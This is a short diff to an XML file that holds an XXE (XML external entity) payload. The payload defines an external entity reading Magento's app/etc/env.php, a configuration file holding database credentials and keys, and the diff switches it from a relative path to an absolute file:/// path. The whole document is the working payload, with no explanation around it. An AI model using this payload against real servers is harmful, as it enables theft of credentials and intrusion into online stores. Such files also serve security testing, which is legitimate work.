@@ -1,5 +1,5 @@
 <!DOCTYPE root [
 <!ELEMENT root ANY >
-<!ENTITY file SYSTEM "../app/etc/env.php">
+<!ENTITY file SYSTEM "file:///var/www/html/magento2/app/etc/env.php">
 ]>
 <root>&file;</root>
